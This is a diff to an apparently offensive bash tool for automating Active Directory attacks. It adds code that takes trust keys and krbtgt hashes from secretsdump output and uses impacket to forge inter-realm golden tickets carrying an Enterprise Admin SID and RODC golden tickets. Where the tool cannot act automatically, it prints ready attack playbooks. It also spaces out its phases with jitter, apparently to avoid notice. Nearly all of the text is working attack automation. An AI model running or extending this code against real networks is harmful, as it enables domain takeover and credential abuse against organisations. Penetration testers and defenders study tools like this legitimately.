@@ -22,7 +22,7 @@ set -o pipefail
 # ===========================================================================
 #  METADATA
 # ===========================================================================
-readonly VERSION="1.24.0"
+readonly VERSION="1.25.0"
 readonly AUTHOR="c4sh3r"
 KERBRUTE_BIN="${KERBRUTE_BIN:-/opt/kerbrute}"
 
@@ -2046,7 +2046,69 @@ phase_trusts() {
             [[ -s "$OUTDIR/kerberoast_xforest_${pd}.txt" ]] && \
                 loot "★ Cross-forest Kerberoast hashes from $pd → kerberoast_xforest_${pd}.txt"
         fi
+        # SID-history / inter-realm golden trust ticket: only ABUSABLE once we're DA
+        # here AND hold the inter-realm trust key (dump it via DCSync of the TDO).
+        if [[ "$IS_DC_ADMIN" == "1" ]]; then
+            local tkey psid
+            tkey=$(grep -iE "(\\[in\\]|\\[out\\]|trust).*${pd%%.*}|^${pd%%.*}\\\$:" "$OUTDIR/secretsdump.txt" 2>/dev/null | grep -oiE '[0-9a-f]{32}' | head -1)
+            if [[ -n "$tkey" ]] && have impacket-ticketer; then
+                loot "★ Trust key for $pd in hand → forging inter-realm golden trust ticket (SID history)"
+                psid=$( impacket-lookupsid "${DOMAIN}/${USER}@${pd}" -hashes ":${HASH:-}" 2>/dev/null | grep -oiP 'Domain SID is:\s*\KS-1-5-21-[0-9-]+' | head -1 )
+                local osid; osid=$(grep -oiE 'S-1-5-21-[0-9-]+' "$OUTDIR/secretsdump.txt" | head -1)
+                ( cd "$OUTDIR" && impacket-ticketer -nthash "$tkey" -domain-sid "$osid" -domain "$DOMAIN" \
+                    ${psid:+-extra-sid "${psid}-519"} Administrator >/dev/null 2>&1 \
+                    && mv -f Administrator.ccache "trust_${pd}_Administrator.ccache" 2>/dev/null )
+                [[ -f "$OUTDIR/trust_${pd}_Administrator.ccache" ]] \
+                    && loot "★ Inter-realm trust ticket → trust_${pd}_Administrator.ccache (EA on $pd)"
+            else
+                echo -e "      ${C_GREY}- SID History / inter-realm TGT (DA here + trust key needed):${C_RESET}"
+                echo -e "        ${C_CYAN}impacket-ticketer -nthash <trust_key> -domain-sid <THIS_SID> -domain $DOMAIN -extra-sid <${pd}_SID>-519 Administrator${C_RESET}"
+            fi
+        else
+            echo -e "      ${C_GREY}- If bidirectional + SIDHistory not filtered → SID History / inter-realm TGT (needs DA here first)${C_RESET}"
+        fi
     done
+}
+
+# ===========================================================================
+#  RODC ABUSE  —  Read-Only DC key abuse. PRECONDITION-GATED: only meaningful if
+#  an RODC exists, and only AUTO-abusable once we hold that RODC's own krbtgt
+#  (krbtgt_<RID>) — then we can forge RODC-scoped golden tickets. Otherwise it
+#  reports the RODC + the accounts it may cache + an accurate playbook. No RODC
+#  in the domain → it no-ops. Runs once per run.
+# ===========================================================================
+RODC_DONE=0
+phase_rodc_abuse() {
+    [[ "$DO_ABUSE" != "1" || "$RODC_DONE" == "1" ]] && return
+    [[ "$CAP_LDAP" != "1" || -z "$DOMAIN" ]] && return
+    RODC_DONE=1
+    local base="dc=${DOMAIN//./,dc=}" rodc="" filt='(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=67108864))'
+    local -a attrs=(sAMAccountName dNSHostName msDS-RevealOnDemandGroup msDS-KrbTgtLink)
+    if   [[ -n "$KERB_TICKET" ]]; then rodc=$(KRB5CCNAME="$KERB_TICKET" ldapsearch -LLL -Y GSSAPI -H "ldap://${DC_FQDN:-$DC_IP}" -b "$base" "$filt" "${attrs[@]}" 2>/dev/null)
+    elif [[ -n "$PASS" ]];       then rodc=$(ldapsearch -LLL -x -H "ldap://$DC_IP" -D "${USER}@${DOMAIN}" -w "$PASS" -b "$base" "$filt" "${attrs[@]}" 2>/dev/null)
+    fi
+    [[ -z "$rodc" ]] && { info "No RODC in this domain → RODC abuse N/A"; return; }
+
+    section "RODC ABUSE · read-only DC key abuse"
+    local rname rkt; rname=$(grep -oiP 'sAMAccountName:\s*\K\S+' <<<"$rodc" | head -1)
+    rkt=$(grep -oiP 'msDS-KrbTgtLink:\s*CN=\K[^,]+' <<<"$rodc" | head -1)
+    loot "RODC present: ${C_BOLD}${rname}${C_RESET}  (its krbtgt: ${rkt:-krbtgt_<RID>})"
+    grep -oiP 'msDS-RevealOnDemandGroup:\s*\K.*' <<<"$rodc" | while read -r g; do detail "      Allowed-to-cache: $g"; done
+
+    local rkt_hash=""
+    [[ -n "$rkt" ]] && rkt_hash=$(grep -iE "^${rkt}:" "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1 | cut -d: -f4)
+    if [[ -n "$rkt_hash" ]] && have impacket-ticketer; then
+        local sid; sid=$(grep -oiE 'S-1-5-21-[0-9-]+' "$OUTDIR/secretsdump.txt" 2>/dev/null | head -1)
+        loot "★ We hold the RODC krbtgt (${rkt}) → forging RODC golden ticket"
+        ( cd "$OUTDIR" && impacket-ticketer -nthash "$rkt_hash" -domain-sid "${sid:-S-1-5-21-0-0-0}" -domain "$DOMAIN" Administrator >/dev/null 2>&1 \
+            && mv -f Administrator.ccache rodc_golden_Administrator.ccache 2>/dev/null )
+        [[ -f "$OUTDIR/rodc_golden_Administrator.ccache" ]] && loot "★ RODC golden ticket → rodc_golden_Administrator.ccache"
+    else
+        info "Not auto-abusable yet: need the RODC krbtgt hash (${rkt:-krbtgt_<RID>})."
+        detail "      # compromise the RODC, then dump its own krbtgt and forge:"
+        detail "      impacket-secretsdump <rodc_admin>@${rname%\$}   # → ${rkt:-krbtgt_<RID>} hash"
+        detail "      impacket-ticketer -nthash <rodc_krbtgt> -domain-sid <SID> -domain ${DOMAIN} <allowed_account>"
+    fi
 }
 
 # ===========================================================================
@@ -5139,6 +5201,7 @@ assess_current_credential() {
     phase_recycle_disabled; jitter
     phase_relay;        jitter
     phase_trusts;       jitter
+    phase_rodc_abuse;   jitter
     phase_asreproast;   jitter
     phase_kerberoast;   jitter
     phase_adcs;         jitter
